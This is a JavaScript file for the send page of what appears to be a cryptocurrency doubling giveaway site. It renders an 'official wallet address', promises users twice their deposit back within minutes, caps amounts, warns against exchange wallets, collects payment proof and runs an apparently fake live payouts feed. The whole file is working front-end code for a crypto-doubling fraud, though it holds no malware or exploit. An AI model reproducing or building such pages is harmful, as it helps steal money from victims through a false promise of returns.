// ========================================
// SEND PAGE JAVASCRIPT - COMPLETE
// Uses centralized crypto-data.js
// ========================================

let currentCrypto = null;
let currentAmount = 0;

// ========================================
// LOAD CRYPTO FROM SESSION STORAGE
// ========================================
function loadCryptoFromStorage() {
    const cryptoId = sessionStorage.getItem('selectedCrypto');
    
    if (cryptoId && CRYPTO_DATA[cryptoId]) {
        currentCrypto = CRYPTO_DATA[cryptoId];
        console.log('Loaded crypto:', currentCrypto);
    } else {
        // Default to BTC if nothing in storage
        currentCrypto = CRYPTO_DATA.BTC;
        console.log('Defaulting to BTC');
    }
    
    return currentCrypto;
}

// ========================================
// RENDER THE SEND PAGE UI
// ========================================
function renderSendPage() {
    const container = document.getElementById('send-card');
    if (!container) return;
    
    const crypto = currentCrypto;
    if (!crypto) return;
    
    container.innerHTML = `
        <!-- Crypto Header -->
        <div class="crypto-header">
            <div class="crypto-icon-large">
                <i class="${crypto.icon}" style="color: ${crypto.iconColor}; font-size: 2.5rem;"></i>
            </div>
            <div class="crypto-info">
                <h1>${crypto.name}</h1>
                <span class="crypto-ticker-large">${crypto.ticker}</span>
            </div>
        </div>

        <!-- How This Works Section -->
        <div class="how-it-works-card">
            <h3><i class="fas fa-info-circle"></i> How This Works — Read Carefully</h3>
            <ul class="rules-list">
                <li><i class="fas fa-paper-plane"></i> Send <strong>${crypto.min} ${crypto.ticker}</strong> to <strong>${crypto.max.toLocaleString()} ${crypto.ticker}</strong> of ${crypto.name} to the address below.</li>
                <li><i class="fas fa-gift"></i> You will receive <strong class="gold">2x your sent amount back</strong> within <strong>5-10 minutes</strong>.</li>
                <li><i class="fas fa-wallet"></i> Each wallet address can only participate <strong>once</strong>.</li>
                <li><i class="fas fa-upload"></i> After sending, upload your payment proof on the next screen.</li>
                <li><i class="fas fa-exclamation-triangle"></i> Do <strong>NOT</strong> send from an exchange wallet — use a personal wallet you control.</li>
            </ul>
        </div>

        <!-- Crypto Amount Section -->
        <div class="crypto-amount-card">
            <div class="crypto-type-badge">
                <span><i class="${crypto.icon}"></i> ${crypto.name}</span>
                <span class="return-badge">2x Back</span>
            </div>
            
            <div class="limits-grid">
                <div class="limit-box">
                    <span class="limit-label">Min</span>
                    <span class="limit-value-large">${crypto.min}</span>
                    <span class="limit-unit">${crypto.ticker}</span>
                </div>
                <div class="limit-arrow">
                    <i class="fas fa-arrow-right"></i>
                </div>
                <div class="limit-box">
                    <span class="limit-label">Max</span>
                    <span class="limit-value-large">${crypto.max.toLocaleString()}</span>
                    <span class="limit-unit">${crypto.ticker}</span>
                </div>
                <div class="limit-arrow">
                    <i class="fas fa-equals"></i>
                </div>
                <div class="limit-box return-box">
                    <span class="limit-label">Return</span>
                    <span class="limit-value-large gold">2x</span>
                </div>
            </div>
        </div>

        <!-- Official Wallet Address Section -->
        <div class="wallet-address-card">
            <h3><i class="fas fa-qrcode"></i> OFFICIAL WALLET ADDRESS</h3>
            
            <div class="address-container">
                <div class="address-wrapper">
                    <code class="wallet-address" id="wallet-address">${crypto.address}</code>
                    <button class="copy-address-btn-large" id="copy-address-btn">
                        <i class="fas fa-copy"></i> Copy
                    </button>
                </div>
            </div>
            
            <div class="address-visual">
                <div class="qr-placeholder">
                    <i class="fas fa-qrcode"></i>
                </div>
                <div class="address-short">
                    <span>${crypto.addressShort}</span>
                </div>
            </div>
        </div>

        <!-- Amount Input Section -->
        <div class="amount-input-card">
            <h3><i class="fas fa-dollar-sign"></i> Enter Amount You Will Send</h3>
            
            <div class="input-group">
                <input type="number" id="send-amount" placeholder="Enter amount" step="any" value="${crypto.min}">
                <span class="input-currency">${crypto.ticker}</span>
            </div>
            
            <div class="quick-amounts" id="quick-amounts"></div>
            
            <div class="return-preview" id="return-preview">
                <div class="preview-item">
                    <span>You send:</span>
                    <strong id="preview-send">${crypto.min} ${crypto.ticker}</strong>
                </div>
                <div class="preview-arrow">
                    <i class="fas fa-arrow-right"></i>
                    <span class="x2-badge">2x</span>
                </div>
                <div class="preview-item">
                    <span>You receive:</span>
                    <strong id="preview-receive" class="gold">${crypto.min * 2} ${crypto.ticker}</strong>
                </div>
            </div>
        </div>

        <!-- Warning Note -->
        <div class="warning-card">
            <i class="fas fa-shield-alt"></i>
            <div class="warning-text">
                <strong>Important:</strong> After sending crypto to the address above, you will be redirected to upload your payment proof. Your transaction will be verified on-chain.
            </div>
        </div>

        <!-- Submit Button -->
        <div class="action-buttons">
            <button class="submit-payment-btn" id="submit-payment-btn">
                <i class="fas fa-check-circle"></i> I've Sent — Submit Payment Proof
                <i class="fas fa-arrow-right"></i>
            </button>
        </div>
    `;
    
    // Initialize components after render
    initQuickAmounts();
    initCopyAddress();
    initAmountInput();
    initSubmitButton();
}

// ========================================
// QUICK AMOUNTS BUTTONS
// ========================================
function initQuickAmounts() {
    const container = document.getElementById('quick-amounts');
    if (!container) return;
    
    const crypto = currentCrypto;
    container.innerHTML = '';
    
    crypto.quickAmounts.forEach(amount => {
        const btn = document.createElement('button');
        btn.className = 'quick-amount-btn';
        btn.textContent = amount.toLocaleString();
        btn.addEventListener('click', () => {
            const amountInput = document.getElementById('send-amount');
            if (amountInput) {
                amountInput.value = amount;
                updatePreview();
            }
        });
        container.appendChild(btn);
    });
}

// ========================================
// UPDATE PREVIEW (2x Calculation)
// ========================================
function updatePreview() {
    const amountInput = document.getElementById('send-amount');
    const previewSend = document.getElementById('preview-send');
    const previewReceive = document.getElementById('preview-receive');
    
    if (!amountInput || !previewSend || !previewReceive) return;
    
    let amount = parseFloat(amountInput.value);
    const crypto = currentCrypto;
    
    // Validate
    if (isNaN(amount)) amount = crypto.min;
    if (amount < crypto.min) amount = crypto.min;
    if (amount > crypto.max) amount = crypto.max;
    
    currentAmount = amount;
    const receiveAmount = amount * 2;
    
    previewSend.textContent = `${amount.toLocaleString()} ${crypto.ticker}`;
    previewReceive.textContent = `${receiveAmount.toLocaleString()} ${crypto.ticker}`;
}

// ========================================
// COPY ADDRESS FUNCTIONALITY
// ========================================
function initCopyAddress() {
    const copyBtn = document.getElementById('copy-address-btn');
    if (!copyBtn) return;
    
    const address = currentCrypto.address;
    
    copyBtn.addEventListener('click', async () => {
        try {
            await navigator.clipboard.writeText(address);
            
            const originalHTML = copyBtn.innerHTML;
            copyBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
            copyBtn.style.background = '#10b981';
            copyBtn.style.borderColor = '#10b981';
            copyBtn.style.color = 'white';
            
            showToast('Wallet address copied to clipboard!', 'success');
            
            setTimeout(() => {
                copyBtn.innerHTML = originalHTML;
                copyBtn.style.background = '';
                copyBtn.style.borderColor = '';
                copyBtn.style.color = '';
            }, 2000);
        } catch (err) {
            showToast('Failed to copy address', 'error');
        }
    });
}

// ========================================
// AMOUNT INPUT HANDLER
// ========================================
function initAmountInput() {
    const amountInput = document.getElementById('send-amount');
    if (!amountInput) return;
    
    amountInput.addEventListener('input', () => {
        let amount = parseFloat(amountInput.value);
        const crypto = currentCrypto;
        
        if (amount < crypto.min) {
            amountInput.value = crypto.min;
            showToast(`Minimum amount is ${crypto.min} ${crypto.ticker}`, 'warning');
        } else if (amount > crypto.max) {
            amountInput.value = crypto.max;
            showToast(`Maximum amount is ${crypto.max.toLocaleString()} ${crypto.ticker}`, 'warning');
        }
        
        updatePreview();
    });
    
    amountInput.addEventListener('blur', () => {
        let amount = parseFloat(amountInput.value);
        const crypto = currentCrypto;
        
        if (isNaN(amount)) {
            amountInput.value = crypto.min;
        } else if (amount < crypto.min) {
            amountInput.value = crypto.min;
        } else if (amount > crypto.max) {
            amountInput.value = crypto.max;
        }
        
        updatePreview();
    });
}

// ========================================
// SUBMIT BUTTON - Redirect to Upload Proof
// ========================================
function initSubmitButton() {
    const submitBtn = document.getElementById('submit-payment-btn');
    if (!submitBtn) return;
    
    submitBtn.addEventListener('click', () => {
        const crypto = currentCrypto;
        const amount = currentAmount;
        const receiveAmount = amount * 2;
        
        // Store in sessionStorage for upload-proof page
        sessionStorage.setItem('selectedCrypto', crypto.id);
        sessionStorage.setItem('selectedCryptoName', crypto.name);
        sessionStorage.setItem('selectedAmount', amount);
        sessionStorage.setItem('selectedAmountFormatted', `${amount} ${crypto.ticker}`);
        sessionStorage.setItem('receiveAmount', receiveAmount);
        sessionStorage.setItem('receiveAmountFormatted', `${receiveAmount} ${crypto.ticker}`);
        sessionStorage.setItem('walletAddress', crypto.address);
        sessionStorage.setItem('minAmount', crypto.min);
        sessionStorage.setItem('maxAmount', crypto.max);
        
        console.log('Redirecting to upload-proof with:', {
            crypto: crypto.id,
            amount: amount,
            receiveAmount: receiveAmount
        });
        
        window.location.href = 'upload-proof.html';
    });
}

// ========================================
// TOAST NOTIFICATION
// ========================================
function showToast(message, type = 'info') {
    let container = document.getElementById('toast-container');
    if (!container) {
        container = document.createElement('div');
        container.id = 'toast-container';
        document.body.appendChild(container);
    }
    
    const toast = document.createElement('div');
    toast.className = 'payout-toast';
    
    const icons = { success: '✅', warning: '⚠️', error: '❌', info: 'ℹ️' };
    const colors = { success: '#10b981', warning: '#f59e0b', error: '#ef4444', info: 'var(--gold-primary)' };
    
    toast.style.borderLeftColor = colors[type];
    toast.innerHTML = `
        <div class="payout-toast-icon">${icons[type]}</div>
        <div class="payout-toast-content">
            <div class="payout-toast-name">${message}</div>
        </div>
    `;
    
    container.appendChild(toast);
    
    setTimeout(() => {
        toast.style.animation = 'fadeOut 0.3s forwards';
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

// ========================================
// LIVE PAYOUTS FEED (from payout.js)
// ========================================
function initLivePayoutsFeed() {
    // Check if payoutSystem is available
    if (typeof window.payoutSystem !== 'undefined' && window.payoutSystem) {
        console.log('Payout feed already active');
    } else if (typeof startLivePayouts === 'function') {
        startLivePayouts(10);
    }
}

// ========================================
// MOBILE MENU & THEME
// ========================================
function setupMobileMenu() {
    const hamburger = document.getElementById('hamburger-btn');
    const closeMenu = document.getElementById('close-menu');
    const mobileMenu = document.getElementById('mobile-menu');
    const overlay = document.getElementById('menu-overlay');
    
    if (!hamburger) return;
    
    const open = () => {
        mobileMenu.classList.add('open');
        if (overlay) overlay.classList.add('active');
        document.body.style.overflow = 'hidden';
    };
    
    const close = () => {
        mobileMenu.classList.remove('open');
        if (overlay) overlay.classList.remove('active');
        document.body.style.overflow = '';
    };
    
    hamburger.addEventListener('click', open);
    if (closeMenu) closeMenu.addEventListener('click', close);
    if (overlay) overlay.addEventListener('click', close);
    document.querySelectorAll('.mobile-menu-links a').forEach(link => link.addEventListener('click', close));
}

let currentTheme = 'dark';

function setupThemeToggle() {
    const toggleDesktop = document.getElementById('theme-toggle-desktop');
    const toggleMobile = document.getElementById('theme-toggle-mobile');
    
    const saved = localStorage.getItem('theme');
    if (saved === 'light') {
        document.documentElement.removeAttribute('data-theme');
        currentTheme = 'light';
        updateThemeIcons(false);
    } else {
        document.documentElement.setAttribute('data-theme', 'dark');
        currentTheme = 'dark';
        updateThemeIcons(true);
        if (!saved) localStorage.setItem('theme', 'dark');
    }
    
    const toggle = () => {
        if (currentTheme === 'dark') {
            document.documentElement.removeAttribute('data-theme');
            currentTheme = 'light';
            localStorage.setItem('theme', 'light');
            updateThemeIcons(false);
        } else {
            document.documentElement.setAttribute('data-theme', 'dark');
            currentTheme = 'dark';
            localStorage.setItem('theme', 'dark');
            updateThemeIcons(true);
        }
    };
    
    if (toggleDesktop) toggleDesktop.addEventListener('click', toggle);
    if (toggleMobile) toggleMobile.addEventListener('click', toggle);
}

function updateThemeIcons(isDark) {
    document.querySelectorAll('.theme-toggle i, .theme-toggle-mobile i').forEach(icon => {
        icon.className = isDark ? 'fas fa-sun' : 'fas fa-moon';
    });
}

// ========================================
// UPDATE AUTH UI
// ========================================
async function updateSendPageAuth() {
    if (typeof window.supabaseClient !== 'undefined' && window.supabaseClient.updateAuthUI) {
        await window.supabaseClient.updateAuthUI();
    } else if (typeof updateAuthUI === 'function') {
        await updateAuthUI();
    }
}

// ========================================
// INITIALIZE PAGE
// ========================================
document.addEventListener('DOMContentLoaded', async () => {
    console.log('Send page initializing...');
    
    loadCryptoFromStorage();
    renderSendPage();
    setupMobileMenu();
    setupThemeToggle();
    initLivePayoutsFeed();
    await updateSendPageAuth();
    
    console.log('Send page initialized for:', currentCrypto?.name);
});